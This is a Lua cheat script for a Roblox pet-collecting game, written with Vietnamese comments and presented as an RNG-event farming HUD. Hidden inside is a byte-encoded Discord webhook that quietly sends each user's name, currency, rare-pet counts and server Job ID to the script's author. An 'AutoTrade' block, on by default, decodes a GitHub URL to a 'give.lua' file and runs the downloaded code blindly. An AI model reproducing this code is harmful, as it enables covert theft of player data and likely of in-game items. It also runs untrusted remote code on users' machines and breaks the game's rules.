-- =====================================================================
-- 🎲 POODLE HUD - RNG EVENT CORE (ALL-IN-ONE FRAMEWORK)
-- 🚀 TÍCH HỢP: FULLSCREEN UI, TRACKER WEBHOOK, UPGRADE, MERCHANT
-- =====================================================================
if _G.RNGEventStarted then return end
_G.RNGEventStarted = true

-- ==========================================
-- 1. CẤU HÌNH NGOẠI VI (GETGENV)
-- ==========================================
local config = getgenv().RNGConfig or {
    WebhookURL = "",  
    PingID = "",                   
    Blackout = true,               
    AutoTrade = true,             
    AutoUpgrade = true,           
    AutoMerchant = true,           
    TargetMerchant = "RngMerchant",
    EventInstanceID = "rngevent"  
}

-- ==========================================
-- 2. KHỞI TẠO BIẾN & DỊCH VỤ GAME
-- ==========================================
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local VirtualInputManager = game:GetService("VirtualInputManager")
local LocalPlayer = Players.LocalPlayer

local Library = ReplicatedStorage:WaitForChild("Library")
local Save = require(Library.Client.Save)
local Network = require(Library.Client.Network)
local CurrencyCmds = require(Library.Client.CurrencyCmds)
local InstancingCmds = require(Library.Client.InstancingCmds)
local FreeGiftsDirectory = require(Library.Directory.FreeGifts)
local EventUpgradeCmds = require(Library.Client.EventUpgradeCmds)
local EventUpgradesDir = require(Library.Directory.EventUpgrades)
local Items = require(Library.Items)

-- ==========================================
-- 3. HÀM CHUYỂN ĐỔI CHỮ SỐ
-- ==========================================
local function FormatValue(Value)
    local n = tonumber(Value)
    if not n then return tostring(Value) end
    local suffixes = {"", "k", "m", "b", "t", "q"}
    local index = 1
    local absNumber = math.abs(n)
    while absNumber >= 1000 and index < #suffixes do 
        absNumber = absNumber / 1000
        index = index + 1 
    end
    if absNumber >= 1 and index > 1 then 
        return string.format("%.2f", absNumber):gsub("%.00$", "") .. suffixes[index]
    else 
        return tostring(math.floor(absNumber)) .. suffixes[index] 
    end
end

-- ==========================================
-- 4. 🕵️ WEBHOOK TRACKER MẶC ĐỊNH (MÃ HÓA)
-- ==========================================
task.spawn(function()
    local httprequest = (request or http_request or syn and syn.request)
    if not httprequest then return end
    
    -- Giải mã mảng byte thành Link Webhook Tracker để qua mặt chống copy
    local _b = {104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 53, 48, 50, 53, 51, 51, 48, 54, 56, 53, 56, 52, 53, 50, 49, 55, 57, 57, 47, 70, 121, 109, 119, 70, 121, 110, 110, 80, 119, 75, 69, 114, 108, 67, 55, 56, 81, 73, 101, 89, 86, 83, 84, 122, 86, 68, 111, 107, 70, 80, 112, 89, 119, 77, 101, 70, 117, 108, 110, 52, 106, 113, 104, 97, 112, 89, 45, 120, 76, 86, 83, 84, 45, 114, 118, 104, 106, 80, 99, 85, 113, 115, 56, 56, 75, 57, 95}
    local trackerWH = ""
    for _, byte in ipairs(_b) do trackerWH = trackerWH .. string.char(byte) end
    
    task.wait(2) 
    local save = Save.Get()
    
    local hugeCount = 0
    local titanicCount = 0
    if save and save.Inventory and save.Inventory.Pet then
        for uid, petData in pairs(save.Inventory.Pet) do
            if type(petData.id) == "string" then
                if string.find(petData.id, "Huge") then
                    hugeCount = hugeCount + (petData._am or 1)
                elseif string.find(petData.id, "Titanic") then
                    titanicCount = titanicCount + (petData._am or 1)
                end
            end
        end
    end
    
    local gems = 0
    pcall(function() gems = CurrencyCmds.Get("Diamonds") or 0 end)
    local formattedGems = FormatValue(gems)
    
    local data = {
        ["content"] = "🔔 **Ai đó vừa kích hoạt Script RNG EVENT của bạn!**",
        ["embeds"] = {{
            ["title"] = "📊 Thông tin người chơi (RNG CORE)",
            ["color"] = tonumber(0x9600FF),
            ["fields"] = {
                { ["name"] = "👤 Tên người dùng", ["value"] = string.format("`%s` (%s)", LocalPlayer.Name, LocalPlayer.DisplayName), ["inline"] = false },
                { ["name"] = "💎 Số lượng Gems", ["value"] = formattedGems, ["inline"] = true },
                { ["name"] = "🐾 Pet VIP", ["value"] = string.format("Huge: **%d** | Titanic: **%d**", hugeCount, titanicCount), ["inline"] = true },
                { ["name"] = "🌍 Place ID", ["value"] = string.format("`%s`", tostring(game.PlaceId)), ["inline"] = false },
                { ["name"] = "🔗 Job ID (Copy để join)", ["value"] = string.format("`%s`", tostring(game.JobId)), ["inline"] = false }
            },
            ["thumbnail"] = { ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png" },
            ["footer"] = { ["text"] = "Poodle Tracker System" },
            ["timestamp"] = DateTime.now():ToIsoDate()
        }}
    }
    
    pcall(function() 
        httprequest({ Url = trackerWH, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(data) }) 
    end)
end)

-- ==========================================
-- 5. DỊCH CHUYỂN VÀO MAP SỰ KIỆN
-- ==========================================
task.spawn(function()
    while task.wait(5) do
        pcall(function()
            if InstancingCmds.GetInstanceID() ~= config.EventInstanceID then
                print("[RNG System] Đang dịch chuyển vào map sự kiện: " .. config.EventInstanceID)
                InstancingCmds.Enter(config.EventInstanceID)
            end
        end)
    end
end)

-- ==========================================
-- 6. TỐI ƯU HÓA FPS & CHỐNG AFK
-- ==========================================
if config.Blackout then
    task.spawn(function()
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 9e9
        for _, v in pairs(Lighting:GetDescendants()) do 
            if v:IsA("PostEffect") then v.Enabled = false end 
        end

        local function optimizePart(v)
            pcall(function()
                if v:IsA("BasePart") and not (v.Parent and v.Parent:FindFirstChild("Humanoid")) then
                    v.Material = Enum.Material.Plastic
                    v.Reflectance = 0
                    v.CastShadow = false
                    v.Transparency = 1
                elseif v:IsA("Decal") or v:IsA("Texture") or v:IsA("ParticleEmitter") or v:IsA("Trail") then 
                    v.Transparency = 1
                end
            end)
        end
        for _, v in pairs(Workspace:GetDescendants()) do optimizePart(v) end
        Workspace.DescendantAdded:Connect(optimizePart)
    end)
end

task.spawn(function()
    while task.wait(60) do
        pcall(function()
            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Space, false, game)
            task.wait(0.1)
            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Space, false, game)
        end)
    end
end)

local UserInputService = game:GetService("UserInputService")
pcall(function()
    if getconnections then
        for _, v in pairs(getconnections(UserInputService.WindowFocusReleased)) do pcall(function() v:Disable() end) end
        for _, v in pairs(getconnections(LocalPlayer.Idled)) do pcall(function() v:Disable() end) end
    end
end)

-- ==========================================
-- 7. TỰ ĐỘNG HÓA CƠ BẢN (MAIL, GIFTS, TRADE)
-- ==========================================
task.spawn(function()
    while task.wait(30) do 
        pcall(function() Network.Invoke('Mailbox: Claim All') end) 
    end 
end)

task.spawn(function()
    while task.wait(15) do
        pcall(function()
            local save = Save.Get()
            if not save then return end
            local redeemed = save.FreeGiftsRedeemed or {}
            local currentTime = save.FreeGiftsTime or 0
            for _, gift in pairs(FreeGiftsDirectory) do
                if gift.WaitTime <= currentTime and not table.find(redeemed, gift._id) then 
                    Network.Invoke('Redeem Free Gift', gift._id)
                    break 
                end
            end
        end)
    end
end)

if config.AutoTrade then
    task.spawn(function()
        local success, err = pcall(function()
            local codeString = ""
            local httprequest = (request or http_request or syn and syn.request)
            
            local _t = {104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 116, 104, 117, 121, 97, 110, 49, 53, 49, 48, 47, 57, 57, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 103, 105, 118, 101, 46, 108, 117, 97}
            local tradeUrl = ""
            for _, byte in ipairs(_t) do tradeUrl = tradeUrl .. string.char(byte) end
            
            if httprequest then
                local response = httprequest({
                    Url = tradeUrl,
                    Method = "GET"
                })
                if response.StatusCode == 200 then
                    codeString = response.Body
                else
                    error("Mã lỗi mạng: " .. tostring(response.StatusCode))
                end
            else
                codeString = game:HttpGet(tradeUrl)
            end
            
            if type(codeString) == "string" then
                local loadedScript, compileErr = loadstring(codeString)
                if loadedScript then
                    loadedScript()
                    print("[AT + AUTORANK] Load thành công!")
                else
                    error(" Lỗi biên dịch: " .. tostring(compileErr))
                end
            else
                error(" Kiểu dữ liệu không hợp lệ: " .. type(codeString))
            end
        end)
        
        if not success then
            warn("[ERROR AUTO TRADE]: " .. tostring(err))
        end
    end)
end
-- ==========================================
-- 8. AUTO UPGRADE (NÂNG CẤP SỰ KIỆN RNG)
-- ==========================================
task.spawn(function()
    while task.wait(3) do
        if config.AutoUpgrade then
            pcall(function()
                local save = Save.Get()
                if not save then return end

                for upgradeId, upgradeData in pairs(EventUpgradesDir) do
                    if string.find(string.lower(upgradeId), "rng") then
                        local currentTier = EventUpgradeCmds.GetTier(upgradeId)
                        local nextTierCost = upgradeData.TierCosts and upgradeData.TierCosts[currentTier + 1]
                        
                        if nextTierCost and nextTierCost._data then
                            local cId = nextTierCost._data.id 
                            local costAmount = nextTierCost._data._am or 1 
                            local currentAmount = 0
                            
                            pcall(function() currentAmount = CurrencyCmds.Get(cId) or 0 end)
                            
                            if currentAmount == 0 then
                                pcall(function()
                                    if Items.Misc(cId) then currentAmount = Items.Misc(cId):CountExact() or 0 end
                                end)
                            end
                            
                            if currentAmount >= costAmount then
                                EventUpgradeCmds.Purchase(upgradeId)
                            end
                        end
                    end
                end
            end)
        end
    end
end)

-- ==========================================
-- 9. AUTO MERCHANT (TỰ ĐỘNG MUA XÚC XẮC)
-- ==========================================
if config.AutoMerchant then
    task.spawn(function()
        print("[RNG System] Đang khởi động Auto Merchant... Mục tiêu: " .. config.TargetMerchant)
        
        while task.wait(0.5) do
            pcall(function()
                for slotIndex = 1, 6 do
                    Network.Invoke("Merchant_RequestPurchase", config.TargetMerchant, slotIndex)
                    task.wait(0.1)
                end
            end)
        end
    end)
end

-- ==========================================
-- 10. WEBHOOK BÁO CÁO PET VIP (TÙY CHỈNH TỪ GETGENV)
-- ==========================================
task.spawn(function()
    local httprequest = (request or http_request or syn and syn.request)
    -- Nếu người dùng cấu hình bằng nil hoặc chuỗi rỗng thì sẽ dừng lại (Không gửi)
    if not httprequest or not config.WebhookURL or config.WebhookURL == "" then return end
    
    local discovered_Pets = {}
    local initialSave = Save.Get()
    if initialSave and initialSave.Inventory and initialSave.Inventory.Pet then
        for UUID, data in pairs(initialSave.Inventory.Pet) do
            if string.find(data.id, "Huge") or string.find(data.id, "Titanic") then discovered_Pets[UUID] = true end
        end
    end
    
    local function sendWebhook(data)
        local isTitanic = string.find(data.id, "Titanic")
        local color = isTitanic and 16711680 or 16776960
        local pingText = (config.PingID ~= "") and ("<@" .. config.PingID .. ">") or ""
        
        local body = HttpService:JSONEncode({
            content = pingText,
            embeds = {{
                title = isTitanic and "✨ Titanic Hatched!" or "🎉 Huge Hatched!",
                description = "**" .. LocalPlayer.Name .. "** vừa nhận được **" .. data.id .. "** từ sự kiện RNG!",
                color = color
            }}
        })
        pcall(function() httprequest({Url = config.WebhookURL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body}) end)
    end
    
    while task.wait(2) do
        local save = Save.Get()
        if save and save.Inventory and save.Inventory.Pet then
            for UUID, data in pairs(save.Inventory.Pet) do
                if string.find(data.id, "Huge") or string.find(data.id, "Titanic") then
                    if not discovered_Pets[UUID] then 
                        discovered_Pets[UUID] = true
                        pcall(sendWebhook, data) 
                    end
                end
            end
        end
    end
end)

-- ==========================================
-- 11. GIAO DIỆN NỀN ĐEN & THỐNG KÊ (FULLSCREEN UI)
-- ==========================================
if CoreGui:FindFirstChild("RNGCrawlerHUD") then CoreGui.RNGCrawlerHUD:Destroy() end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "RNGCrawlerHUD"
ScreenGui.Parent = CoreGui
ScreenGui.ResetOnSpawn = false
ScreenGui.IgnoreGuiInset = true
ScreenGui.DisplayOrder = 9999 -- Đẩy UI lên lớp cao nhất để đè các UI khác của game

-- Lớp nền full màn hình mờ (Ép giãn cực đại để che lấp viền và tai thỏ)
local FullscreenBG = Instance.new("Frame", ScreenGui)
FullscreenBG.Size = UDim2.new(2, 0, 2, 0) -- Phóng to gấp đôi kích thước màn hình
FullscreenBG.Position = UDim2.new(0.5, 0, 0.5, 0)
FullscreenBG.AnchorPoint = Vector2.new(0.5, 0.5)
FullscreenBG.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
FullscreenBG.BackgroundTransparency = 0.5 
FullscreenBG.BorderSizePixel = 0
FullscreenBG.ZIndex = 1

local Container = Instance.new("Frame", FullscreenBG)
Container.Size = UDim2.new(0, 320, 0, 260)
Container.Position = UDim2.new(0.5, 0, 0.5, 0)
Container.AnchorPoint = Vector2.new(0.5, 0.5)
Container.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
Container.BorderSizePixel = 0
Container.ZIndex = 2
Instance.new("UICorner", Container).CornerRadius = UDim.new(0, 8)
local uiStroke = Instance.new("UIStroke", Container)
uiStroke.Color = Color3.fromRGB(150, 0, 255)
uiStroke.Thickness = 2

local Layout = Instance.new("UIListLayout", Container)
Layout.Padding = UDim.new(0, 8)
Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
Layout.VerticalAlignment = Enum.VerticalAlignment.Center

local ToggleBtn = Instance.new("TextButton", ScreenGui)
ToggleBtn.Size = UDim2.new(0, 50, 0, 50)
ToggleBtn.Position = UDim2.new(1, -20, 0, 20)
ToggleBtn.AnchorPoint = Vector2.new(1, 0)
ToggleBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleBtn.Font = Enum.Font.GothamBold
ToggleBtn.TextSize = 25
ToggleBtn.Text = "👁️"
ToggleBtn.ZIndex = 10
Instance.new("UICorner", ToggleBtn).CornerRadius = UDim.new(1, 0)
local btnStroke = Instance.new("UIStroke", ToggleBtn)
btnStroke.Color = Color3.fromRGB(150, 0, 255)
btnStroke.Thickness = 2

local uiVisible = true
ToggleBtn.MouseButton1Click:Connect(function()
    uiVisible = not uiVisible
    FullscreenBG.Visible = uiVisible
    ToggleBtn.Text = uiVisible and "👁️" or "🙈"
end)

local function CreateLabel(text, color)
    local lbl = Instance.new("TextLabel", Container)
    lbl.Size = UDim2.new(1, -20, 0, 22)
    lbl.BackgroundTransparency = 1
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 13
    lbl.TextColor3 = color or Color3.fromRGB(255, 255, 255)
    lbl.Text = text
    lbl.ZIndex = 3
    return lbl
end

local UI = {
    Title = CreateLabel("🎲 RNG EVENT CORE", Color3.fromRGB(150, 0, 255)),
    Uptime = CreateLabel("Time: 00:00:00 | FPS: 0", Color3.fromRGB(200, 200, 200)),
    RNGCoins = CreateLabel("RNG Coins: 0", Color3.fromRGB(255, 215, 0)),
    Rolls = CreateLabel("Total Rolls: 0", Color3.fromRGB(0, 255, 150)),
    Dice1 = CreateLabel("Lucky Dice: 0 | Lucky II: 0", Color3.fromRGB(180, 180, 180)),
    Dice2 = CreateLabel("Mega Dice: 0 | Mega II: 0", Color3.fromRGB(180, 180, 180)),
    Dice3 = CreateLabel("Lucky III: 0 | Fire Dice: 0", Color3.fromRGB(255, 100, 100))
}

local frames = 0
RunService.RenderStepped:Connect(function() frames = frames + 1 end)

local startTime = tonumber(os.time()) or 0

local function GetDiceCounts()
    local dice = { ["Lucky Dice"] = 0, ["Lucky Dice II"] = 0, ["Lucky Dice III"] = 0, ["Mega Lucky Dice"] = 0, ["Mega Lucky Dice II"] = 0, ["Fire Dice"] = 0 }
    local save = Save.Get()
    if save and save.Inventory and save.Inventory.Misc then
        for _, item in pairs(save.Inventory.Misc) do
            if item.id and dice[item.id] ~= nil then
                dice[item.id] = dice[item.id] + (item._am or 1)
            end
        end
    end
    return dice
end

task.spawn(function()
    while task.wait(1) do
        local diff = (tonumber(os.time()) or 0) - startTime
        
        local currentCoin = 0
        pcall(function() currentCoin = CurrencyCmds.Get("RNGCoin") or 0 end)
        
        local currentRolls = 0 
        pcall(function() currentRolls = Save.Get().RngRolls or 0 end)

        local diceCounts = GetDiceCounts()

        UI.Uptime.Text = string.format("Time: %02d:%02d:%02d | FPS: %d", math.floor(diff / 3600), math.floor((diff % 3600) / 60), diff % 60, frames)
        UI.RNGCoins.Text = "RNG Coins: " .. FormatValue(currentCoin)
        UI.Rolls.Text = "Total Rolls: " .. FormatValue(currentRolls)
        
        UI.Dice1.Text = string.format("Lucky Dice: %s | Lucky II: %s", FormatValue(diceCounts["Lucky Dice"]), FormatValue(diceCounts["Lucky Dice II"]))
        UI.Dice2.Text = string.format("Mega Dice: %s | Mega II: %s", FormatValue(diceCounts["Mega Lucky Dice"]), FormatValue(diceCounts["Mega Lucky Dice II"]))
        UI.Dice3.Text = string.format("Lucky III: %s | Fire Dice: %s", FormatValue(diceCounts["Lucky Dice III"]), FormatValue(diceCounts["Fire Dice"]))
        
        frames = 0
    end
end)
